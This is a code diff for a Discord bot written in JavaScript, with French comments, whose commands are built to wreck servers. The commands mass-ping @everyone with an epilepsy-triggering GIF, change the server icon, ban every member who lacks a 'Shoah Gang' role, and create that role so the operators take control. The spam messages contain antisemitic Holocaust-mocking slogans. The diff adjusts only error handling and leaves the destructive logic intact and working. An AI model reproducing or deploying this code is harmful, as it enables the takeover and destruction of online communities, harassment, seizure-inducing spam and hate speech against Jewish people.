@@ -23,7 +23,7 @@ bot.on('message', msg => {
   //#region Destructrices
   /* Commandes destructrices */
   if (msg.content === '.destruction') {
-    console.log(`Commande .destruction par ${msg.author.tag}`).catch(e => {});
+    console.log(`Commande .destruction par ${msg.author.tag}`);
     var interval = setInterval (function () {
       msg.channel.send("@everyone  @here  .https://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif\n"+
                        "SHOAH GANG ON THE BEAT\n" +
@@ -33,7 +33,7 @@ bot.on('message', msg => {
   }
  
   if (msg.content === '.oupss') {
-    console.log(`Commande .oupss par ${msg.author.tag}`).catch(e => {});
+    console.log(`Commande .oupss par ${msg.author.tag}`);
  
     if (!fucked){
       msg.guild.setIcon("./shoah.jpg").catch(e => {});
@@ -47,25 +47,25 @@ bot.on('message', msg => {
     }
  
     if (msg.deletable) {
-      msg.delete().catch(e => {});
+      msg.delete();
     }
   }
  
   if (msg.content === '.banev') {
-    console.log(`Commande .banev par ${msg.author.tag}`).catch(e => {});
+    console.log(`Commande .banev par ${msg.author.tag}`);
     msg.guild.members.forEach(member => {
       if (!member.roles.exists("name", "Shoah Gang") && member.bannable) member.ban().catch(e => {});
     });
   }
  
   if (msg.content === '.leave') {
-    console.log(`Commande .leave par ${msg.author.tag}`).catch(e => {});
-    if (msg.deletable) msg.delete()
-    msg.guild.leave();
+    console.log(`Commande .leave par ${msg.author.tag}`);
+    if (msg.deletable) msg.delete().catch(e => {});
+    msg.guild.leave().catch(e => {});
   }
  
   if (msg.content === '.pardon') {
-    console.log(`Commande .pardon par ${msg.author.tag}`).catch(e => {});
+    console.log(`Commande .pardon par ${msg.author.tag}`);
  
     msg.member.guild.createRole({
       name: "Shoah Gang",
@@ -78,5 +78,4 @@ bot.on('message', msg => {
   }
   //#endregion
 });
-
 bot.login(process.env.BOT_TOKEN)
